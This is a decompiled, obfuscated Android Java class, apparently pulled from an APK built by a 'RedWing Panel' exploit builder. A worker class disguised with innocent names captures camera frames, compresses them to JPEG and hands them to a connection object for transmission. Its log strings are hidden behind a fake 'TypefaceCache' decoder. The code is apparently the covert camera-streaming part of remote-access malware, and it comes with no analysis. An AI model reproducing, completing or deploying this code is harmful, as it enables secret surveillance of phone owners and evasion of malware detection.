package v.s;

import android.graphics.Rect;
import android.graphics.YuvImage;
import app.mobilex.plus.services.UtilAIWorker;
import app.mobilex.plus.util.TypefaceCache;
import java.io.ByteArrayOutputStream;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class AbW0SZqZejvB implements Runnable {
    public final /* synthetic */ UtilAIWorker vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;

    public /* synthetic */ AbW0SZqZejvB(UtilAIWorker utilAIWorker, int i) {
        this.w9sT1Swbhx3hs = i;
        this.vekpFI4d1Nc4fakF = utilAIWorker;
    }

    @Override // java.lang.Runnable
    public final void run() {
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                UtilAIWorker utilAIWorker = this.vekpFI4d1Nc4fakF;
                AtomicBoolean atomicBoolean = utilAIWorker.wotphlvK9sPbXJ;
                try {
                    utilAIWorker.w9sT1Swbhx3hs();
                    atomicBoolean.set(false);
                } catch (Exception e) {
                    UtilAIWorker.b1EoSIRjJHO5(TypefaceCache.obtain("003000610052009300F300B70092008200110044007400B500AA00FF") + e.getMessage());
                    atomicBoolean.set(false);
                    return;
                }
                break;
            case 1:
                UtilAIWorker utilAIWorker2 = this.vekpFI4d1Nc4fakF;
                boolean z = UtilAIWorker.MLSIo1htfMPWeB8V876L;
                try {
                    utilAIWorker2.w9sT1Swbhx3hs();
                } catch (Exception e2) {
                    UtilAIWorker.b1EoSIRjJHO5(TypefaceCache.obtain("002C0060005E009500FC00BE00CB00E700060044006900A800C200E50092") + e2.getMessage());
                    return;
                }
                break;
            case 2:
                UtilAIWorker utilAIWorker3 = this.vekpFI4d1Nc4fakF;
                boolean z2 = UtilAIWorker.MLSIo1htfMPWeB8V876L;
                utilAIWorker3.ibVTtJUNfrGYbW();
                break;
            default:
                UtilAIWorker utilAIWorker4 = this.vekpFI4d1Nc4fakF;
                boolean z3 = UtilAIWorker.MLSIo1htfMPWeB8V876L;
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream((utilAIWorker4.hjneShqpF9Tis4 * utilAIWorker4.gmNWMfvn6zlEj) / 4);
                while (utilAIWorker4.pyu8ovAipBTLYAiKab) {
                    try {
                        byte[] bArr = (byte[]) utilAIWorker4.Qrz92kRPw4GcghAc.poll(300L, TimeUnit.MILLISECONDS);
                        if (bArr != null && !utilAIWorker4.wotphlvK9sPbXJ.get()) {
                            byteArrayOutputStream.reset();
                            new YuvImage(bArr, 17, utilAIWorker4.hjneShqpF9Tis4, utilAIWorker4.gmNWMfvn6zlEj, null).compressToJpeg(new Rect(0, 0, utilAIWorker4.hjneShqpF9Tis4, utilAIWorker4.gmNWMfvn6zlEj), utilAIWorker4.xDyLpEZyrcKVe0, byteArrayOutputStream);
                            byte[] byteArray = byteArrayOutputStream.toByteArray();
                            byte[] bArr2 = new byte[byteArray.length + 1];
                            bArr2[0] = 16;
                            System.arraycopy(byteArray, 0, bArr2, 1, byteArray.length);
                            iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                            RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
                            if (rWY6BVSB0XxPbw != null ? rWY6BVSB0XxPbw.nQilHWaqS401ZtR(bArr2) : false) {
                                int i = utilAIWorker4.gIIiyi2ddlMDR0 + 1;
                                utilAIWorker4.gIIiyi2ddlMDR0 = i;
                                if (i == 1) {
                                    UtilAIWorker.b1EoSIRjJHO5(TypefaceCache.obtain("0025007F0049009400E4008000D400B50022007B005E00B800E300BA00DC00B3006F0036") + byteArray.length + "b");
                                }
                            }
                        }
                    } catch (Exception e3) {
                        if (utilAIWorker4.pyu8ovAipBTLYAiKab) {
                            TypefaceCache.obtain("001000730055008300F500AD008800E7");
                            e3.getMessage();
                        }
                    }
                }
                utilAIWorker4.nQilHWaqS401ZtR = false;
                break;
        }
    }
}
